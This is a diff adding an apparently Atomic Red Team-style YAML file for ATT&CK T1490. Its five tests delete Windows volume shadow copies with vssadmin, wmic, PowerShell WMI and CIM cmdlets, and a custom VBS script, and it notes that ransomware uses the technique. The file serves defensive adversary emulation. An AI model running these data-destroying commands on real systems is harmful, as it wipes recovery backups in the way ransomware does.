@@ -1,0 +1,105 @@
+attack_technique: T1490
+display_name: Deletion of shadow copies
+atomic_tests:
+- name: Deletion of shadow copies usign vssadmin
+  auto_generated_guid: c7602653-d8a9-4dbd-b083-a61d55af2332
+  description: |
+    Deletes all shadow copies using the vssadmin.exe utility
+
+  supported_platforms:
+  - windows
+  
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8.
+  
+    prereq_command: if((vssadmin.exe list shadows | findstr "Contained")) { exit 0 } else { exit 1 }
+    get_prereq_command: wmic shadowcopy call create Volume='C:\'
+      
+  executor:
+    command: vssadmin.exe delete shadows /all /quiet
+    name: command_prompt
+    elevation_required: true
+
+- name: Deletion of shadow copies usign WMIC
+  auto_generated_guid: c6b54114-db06-4c83-b0d9-3dfeff5ca87a
+  description: |
+    Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
+    
+  supported_platforms:
+  - windows
+  
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8
+    prereq_command: if((vssadmin.exe list shadows | findstr "Contained")) { exit 0 } else { exit 1 }
+    get_prereq_command: wmic shadowcopy call create Volume='C:\'
+    
+  executor:
+    command: wmic.exe shadowcopy delete
+    name: command_prompt
+    elevation_required: true
+- name: Deletion of shadow copies usign PowerShell and Get-WmiObject
+  auto_generated_guid: 06b2dd4a-39e9-4d59-a59a-00729b9ff567
+  description: |
+    Deletes Windows Volume Shadow Copies via Get-WmiObject Win32_ShadowCopy in powershell with rwmi short for Remove-WmiObject
+    
+    
+  supported_platforms:
+  - windows
+  
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8
+    prereq_command: if((vssadmin.exe list shadows | findstr "Contained")) { exit 0 } else { exit 1 }
+    get_prereq_command: wmic shadowcopy call create Volume='C:\'
+    
+  executor:
+    command: Get-WmiObject Win32_ShadowCopy | rwmi
+    name: powershell
+    elevation_required: true
+    
+- name: Deletion of shadow copies usign PowerShell and Get-CimInstance
+  auto_generated_guid: 30c250ed-b66b-43b8-88ac-ffddf2a4b7e0
+  description: |
+    Deletes Windows Volume Shadow Copies via Get-CimInstance Win32_ShadowCopy in powershell with rcim short for Remove-CimInstance
+    
+    
+  supported_platforms:
+  - windows
+  
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8
+    prereq_command: if((vssadmin.exe list shadows | findstr "Contained")) { exit 0 } else { exit 1 }
+    get_prereq_command: wmic shadowcopy call create Volume='C:\'
+    
+  executor:
+    command: Get-CimInstance Win32_ShadowCopy | rcim
+    name: powershell
+    elevation_required: true
+
+- name: Deletion of shadow copies usign a custom vbs script
+  auto_generated_guid: 8153fe64-3b7c-40e4-9ac0-5f350db4ed35
+  description: |
+    Deletes Windows Volume Shadow Copies via a custom vbs script that comunicates directly with WMI
+    
+  input_arguments:
+    custom_vbs:
+      description: DLL to Inject
+      type: path
+      default: PathToAtomicsFolder\Atomic\src\customscript.vbs
+
+  supported_platforms:
+  - windows
+  
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8
+    prereq_command: if((vssadmin.exe list shadows | findstr "Contained")) { exit 0 } else { exit 1 }
+    get_prereq_command: wmic shadowcopy call create Volume='C:\'
+    
+  executor:
+    command: "#{custom_vbs}"
+    name: powershell
+    elevation_required: true
